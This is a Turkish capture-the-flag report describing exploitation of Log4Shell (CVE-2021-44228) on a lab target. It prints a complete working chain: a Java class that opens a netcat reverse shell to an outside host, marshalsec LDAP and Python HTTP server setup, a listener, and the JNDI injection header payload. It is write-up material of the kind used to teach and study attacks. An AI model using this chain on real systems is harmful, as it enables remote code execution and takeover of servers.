## CTF Raporu – Log4Shell (JNDI Injection) Saldırısı

**Takım Adı:** Takkeliler
**Yazar:** Ak Takkeli Burak
**Tarih:** 15.04.2025

---

###  Zafiyetin Adı / Kategorisi
**Log4Shell (CVE-2021-44228) – Uzak Kod Çalıştırma (RCE)**

---

###  Açıklama
Apache Log4j 2.6.1 sürümü, bilinen Log4Shell (JNDI Injection) açığına karşı savunmasızdır. Bu zafiyet sayesinde, hedef sistemde şu yöntemlerle uzaktan kod çalıştırma sağlanabilir:
- Uygulama, giriş verilerini loglarken Log4j kütüphanesini kullanıyorsa,
- JNDI üzerinden uzak LDAP sunuculara bağlantı sağlanabiliyorsa,
- Bu LDAP sunucular da hedef sistemin kod yürütmesine yol açacak öğeleri sunabiliyorsa.

Bu açık, sıkı sık uygulamalarda loglanan HTTP header bilgileri (User-Agent, Referer, vs.) üzerinden tetiklenebilir. Bu senaryoda, `X-Api-Version` headerı kullanılmıştır.

---

###  Saldırı Aşamaları

#### 1. Endpoint Keşfi
Fuzzing ile hedef uygulamadaki endpointler tespit edildi:

```bash
ffuf -u http://localhost:8080/FUZZ -w ./common.txt
```

Sonuç olarak `/api` ve `/systeminfo` endpoint'leri bulundu. `/systeminfo` endpoint'i sistem hakkında bilgi verirken, `/api` endpoint'i `X-Api-Version` header'larına duyarlıydı.

#### 2. Log4j Versiyonunun Tespiti

Hedef sistemde Log4j 2.6.1 kullanılıyordu. Bu versiyon, JNDI Injection'a karşı savunmasız olduğu için RCE için kullanıldı.

#### 3. Exploit.java Sınıfının Hazırlanması

```java
import java.io.IOException;
public class Exploit {
    static {
        try {
            String[] cmd = {"/bin/sh", "-c", "nc 192.168.157.1 4444 -e /bin/sh"};
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

#### 4. HTTP Sunucusu Kurulumu

Exploit.class dosyasını sunmak için Python HTTP sunucusu kuruldu:

```bash
(base) burak@burak-ABRA-A7-V11-4:~/ctf$ python -m http.server 8888
```

#### 5. LDAP Sunucusu Kurulumu (Marshalsec)

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.245.59:8888/#Exploit"
```

LDAP sunucusu, hedef sistem tarafından istek geldiğinde, HTTP sunucusundan `Exploit.class` dosyasını indirip çalıştıracak şekilde ayarlandı.

#### 6. Reverse Shell Dinleme

Netcat ile 4444 portunda dinleme başlatıldı:

```bash
(base) burak@burak-ABRA-A7-V11-4:~$ nc -lvp 4444
```

#### 7. Postman ile Payload Gönderimi

Postman üzerinden HTTP isteği atıldı:

```
GET /api HTTP/1.1
Host: localhost:8080
X-Api-Version: ${jndi:ldap://192.168.245.59:1389/Exploit}
```

Bu istek, hedef sistemin LDAP sunucusuna bağlanmasını sağladı.

Hedef sistemden gelen bağlantı başarıyla alındı ve shell erişimi elde edildi. Komut çalıştırma ve sistem kontrolü sağlandı.


###  Sonuç
Bu adımlar sonucunda hedef sistemde bulunan Log4Shell (CVE-2021-44228) zafiyetinden faydalanılarak tam yetkili reverse shell erişimi sağlanmıştır. Log4j kütüphanesinin zafiyetli sürümü, LDAP ve HTTP sunucularla birlikte kullanılarak sistemin dışarıdan kod çalıştırması sağlanmıştır.

